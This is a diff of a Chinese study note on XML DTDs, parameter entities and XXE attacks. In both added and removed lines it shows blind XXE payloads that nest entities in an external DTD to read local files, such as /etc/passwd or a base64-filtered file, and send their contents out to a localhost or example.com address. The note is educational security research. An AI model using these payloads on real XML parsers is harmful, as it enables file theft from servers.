@@ -31,6 +31,7 @@ HTML 被设计用来显示数据。
 XML文档结构分为
  - XML声明
  - DTD(文档类型定义)
+  - 文档元素书写约束
  - 文档元素
 
 具体如下：
@@ -46,7 +47,10 @@ XML文档结构分为
 <!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
 <!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
 ]]]>
-
+<!--
+复杂标签：<!ELEMENT 标签名 （子节点）>
+简单标签：<!ELEMENT 标签名 （#PCDATA）>
+-->
 
 <!--文档元素-->
 <!-- 描述文档的根元素（像在说：“本文档是一个便签”）-->
@@ -149,18 +153,72 @@ DTD实体引用是对实体的引用。
 
 ##### 参数实体 (Parameter entities)
 一个只能在 DTD 中定义和使用的实体，一般引用时用 % 作为前缀
-DTD 中使用 % 来定义的参数实体只能在外部子集中使用，或由外部文件定义参数实体，引用到 XML 文件的 DTD 来使用
-
 ```
 <!ENTITY % ename "text">
 
-// 一下为DTD代码
+// 以下为DTD代码
 <!ENTITY % name "content">
 %name;
 ```
 
+参数实体在使用中的限制：
+**在当前DTD处定义的参数实体不能在被当前的DTD参数实体引用(小部分XML解析器可以)**
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ENTITY % file "123">
+<!ENTITY send "%file">
+]>
+<data>&send;</data>
+```
+如以上代码，会报错`parser error : PEReferences forbidden in internal subset`
+
+在[Blind XXE经典payload引发的脑洞](http://gv7.me/articles/2018/think-about-blind-xxe-payload/)中看见了一部分作者的思路，同时引入文档的简单翻译：
+[XMLDTDEntityAttacks.pdf](https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf)
+------------------------
+>对参数实体的引用必须出现在DTD中，并且必须使用”%…;”语法。此外，对于在DTD中使用参数实体的上下文，通常会有各种各样的限制。一个重要的限制(在几个XML解析器中一致地出现)是，虽然参数实体可以定义用于引用的DTD语法(例如”%an-element”)，但是它可能不会定义一个立即被用于另一个DTD标记的值。也就是说，这个语法会在我们测试的解析器中失败:
+```xml
+<!ENTITY % pm "subtag">
+<!ELEMENT mytag (%pm;)>
+```
+
+简单的理解是说：在某些XML解析器中这样做是可以的，但是在某些XML解析器中，这样又不行。所以文档中给出一种解决办法
+>然而，如果实体引用存在于子DTD中，这种样式的语法通常会成功。也就是说，如果文档的DTD引用外部实体，包括使用参数实体引用的外部文档的值，并且外部文档引用前面定义的实体，那么动态构建的DTD标记将被解释为人们所期望的。
+
+使用了文章作者的代码实验，发现这样写没毛病。
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ENTITY % pm "subtag">
+<!ENTITY % b SYSTEM "http://localhost:8088/xxe.dtd">
+%b;
+]>
+<data>send</data>
+
+<!-- xxe.dtd -->
+<!ELEMENT mytag (%pm;)>
+```
+
+但是我们在下面的PAYLOAD中不仅仅使用了外部引用的方式，还对外部实体进行了嵌套。如果不嵌套就会发生各种报错。那么为什么一定要嵌套呢?
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data [
+<!ENTITY % file "123">
+<!ENTITY % b SYSTEM "http://localhost:8088/xxe.dtd">
+%b;
+]>
+<data>&send;</data>
+
+<!-- xxe.dtd -->
+<!ENTITY % a "<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%file;'>">
+%a;
+```
+
+
+
+
 #### 内外部实体声明
-同样，实体可在内部或外部进行声明。
+同样，实体可在内部或外部进行声明。也分别被称为内部子集与外部子集。
 ```
 // 内
 <!ENTITY 实体名称 "实体的值">
@@ -183,7 +241,7 @@ DTD 中使用 % 来定义的参数实体只能在外部子集中使用，或由�
 <author>&writer;&copyright;</author>
 ```
 
-#### 嵌套定义
+#### 实体嵌套
 嵌套定义其实就是在实体中定义实体
 ```
 <?xml version="1.0" encoding="utf-8"?>
@@ -194,31 +252,8 @@ DTD 中使用 % 来定义的参数实体只能在外部子集中使用，或由�
 <c>&send;</c>
 ```
 
-**注意**
-这里引用参考的[大佬文章](https://github.com/PyxYuYu/MyBlog/issues/101)，自己也遇见了这个问题，费了很多时间，在这里找到了答案
->有些解释器不允许在内层实体中使用**外部连接**，无论内层是一般实体还是参数实体，所以需要将嵌套的实体声明放在外部文件中
-
-```
-// 不允许直接使用
-<!ENTITY % file "file:///etc/passwd">
-<!ENTITY % a "<!ENTITY % b SYSTEM 'http://127.0.0.1/?%file;'>">
-%a;
 
 
-
-// 放置外部文件中
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE c [
-   <!ENTITY % file SYSTEM "file:///etc/passwd">
-   <!ENTITY % a SYSTEM "http://example.com/evil.dtd">
- %a;
- %b;
-]>
-<c>&send;</c>
-
-// evil.dtd
-<!ENTITY % b "<!ENTITY send SYSTEM 'http://127.0.0.1/1.php?file=%file;'>">
-```
 
 <br><br>
 # XXE简介
@@ -406,53 +441,42 @@ Warning: simplexml_load_string() [function.simplexml-load-string]: Entity: line 
 # 问题
 
 ## 参数实体问题
-### 问题1(待解决)
+```xml
+问题描述：
+在使用DTD外部引用的时候必须需要3层嵌套，不知道原因
+
+二层嵌套  %data;参数实体不会被解析。
+<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%data;'>
+
+三层嵌套  %data;参数实体被正常解析。
+<!ENTITY % c "<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%data;'>">
+```
 跟404notfound文章的一样的问题，自我感觉是对XML和参数实体还不够熟悉
 >不明白为什么无回显的情况下一定要三层实体嵌套才正确，二层嵌套就不对（evil.xml中直接写成`<!ENTITY % send SYSTEM 'http://localhost:88/?content=%file;'>`或是`<!ENTITY send SYSTEM 'http://localhost:88/?content=%file;'>`）
 
-### 问题2(待解决)
-为什么这样运用参数实体会报错，而在外部实体的时候却能使用
-```
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data [
-<!ENTITY % FILE "<!ENTITY b 'file://d:/test.txt' >">
-<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%file;'>
-]>
-<value>&send;</value>
-```
 
-### 问题3(以解决)
-为什么一定要引入外部文件来实现
-```
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data [
-<!ENTITY % FILE "<!ENTITY b 'file://d:/test.txt' >">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8088/data.php?data=%file;22'>">
-%all;
-]>
-<value>&send;</value>
-```
-原因是有些解释器不允许在内层实体中使用**外部连接**，无论内层是一般实体还是参数实体，所以需要将嵌套的实体声明放在外部文件中
-
-## 问题4
+## 参数实体问题2
 如果使用这种写法，那么send 前面的 `%` 必须用字符实体`&#x25;`来表示。
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE root [
-<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/test/1.txt">
-<!ENTITY % dtd SYSTEM "http://localhost:88/evil.xml">
-%dtd;
-%send;
+<!DOCTYPE data [
+<!ENTITY % file "123">
+<!ENTITY % b SYSTEM "http://localhost:8088/xxe.dtd">
+%b;
 ]>
-<root></root>
+<data>send;</data>
 
 // evil.xml
-<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://localhost:88/?content=%file;'>"> %payload;
+<!ENTITY % a "<!ENTITY &#x25; send SYSTEM 'http://localhost:8088/data.php?data=%file;'>">
+%a;
+%send;
 ```
 <br>
-## XML问题(待解决)
+## XML问题
 一些测试直接用浏览器打开XML文件中无效，但是用simplexml_load_string()函数去解析却有效
-猜测是XML解释器的原因
+
+
+>首先,直接从浏览器中打开XML文件,浏览器会对其进行格式良好性检查,如果不符合XML语法规范则显示出错,如果格式良好,再检查是否包含样式表(CSS或XSL),如果包含样式表,则用样式表格式化XML文档然后显示,如果没有,则显示经过格式化的XML源码(不同浏览器显示方式不一样).注意,浏览器只对XML进行格式良好性检查,而不对其进行有效性检查!
 
 <br>
 # 参考
